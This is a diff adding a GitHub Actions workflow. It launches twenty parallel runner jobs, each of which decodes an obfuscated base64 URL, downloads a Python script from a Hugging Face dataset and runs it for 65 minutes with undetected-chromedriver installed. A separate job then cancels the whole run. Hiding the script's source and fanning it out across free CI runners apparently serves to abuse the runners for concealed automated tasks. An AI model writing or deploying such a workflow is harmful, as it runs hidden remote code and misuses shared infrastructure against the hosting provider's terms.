@@ -1,0 +1,107 @@
+name: Linux Bunker Task Contingent
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: bunker-contingent-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مأمور الإغلاق القاطع: يُنهي سير العمل بالكامل عند علامة 65 دقيقة
+  # =================================================================
+  absolute-shutdown-enforcer:
+    name: "Absolute Shutdown Enforcer"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Enforce Total Shutdown Edict
+        run: |
+          echo "[ENFORCER] Absolute shutdown enforcer on duty. Total shutdown armed at the 65-minute pulse."
+          echo "[ENFORCER] Reading workflow marker: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[ENFORCER] Pulse detected! Enforcing total shutdown edict..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[ENFORCER] Total shutdown edict enforced. All operative and lingering units will be shut down."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات المخبأ
+  # =================================================================
+  erect-bunker:
+    name: "BunkerUnit-${{ matrix.unit_index }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الحلقة (أ): إرساء الأرضية المتقدمة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Anchor Advanced Floor
+        run: |
+          echo "[ANCHOR] Anchoring advanced floor for BunkerUnit-${{ matrix.unit_index }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الحلقة (ب): انتزاع الرقعة التنفيذية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Extract Executive Tablet
+        run: |
+          echo "[EXTRACT] Extracting app_task.py from assigned distribution niche..."
+          DISTRIBUTION_NICHE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$DISTRIBUTION_NICHE" -o app_task.py
+          echo "[EXTRACT] Executive tablet extracted."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الحلقة (ج): إدخال الوحدات المستعينة
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Insert Auxiliary Modules
+        run: |
+          echo "[INSERT] Inserting auxiliary modules..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # ⟴ الحلقة (د): التنفيذ المقيّد بالمدة (65 دقيقة)
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Trigger Restricted Operation
+        run: |
+          echo ">> Erecting BunkerUnit-${{ matrix.unit_index }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          BUNKER_PID=$!
+          
+          echo ">> Restricted operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $BUNKER_PID 2>/dev/null; then
+            echo ">> Restricted window elapsed! Retiring operation..."
+            kill -9 $BUNKER_PID
+            echo ">> Operation retired by restriction keeper."
+          else
+            echo ">> Operation completed within restricted window."
+          fi
